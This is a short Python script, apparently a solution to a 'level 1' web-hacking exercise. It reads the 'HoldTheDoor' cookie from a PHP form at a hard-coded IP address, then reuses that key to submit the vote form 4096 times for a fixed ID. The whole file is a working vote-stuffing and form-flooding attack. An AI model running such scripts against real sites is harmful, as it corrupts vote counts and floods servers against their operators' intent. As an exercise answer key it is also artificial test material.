#!/usr/bin/python3
"""
level_1
"""


import requests

ID = 321
URL = "http://158.69.76.135/level1.php"
req = requests.post(URL)
key = req.cookies['HoldTheDoor']
package = {
    'id': ID,
    'holdthedoor': 'Submit',
    'key': key
}
for i in range(4096):
    requests.post(URL, data=package, cookies={"HoldTheDoor": key})
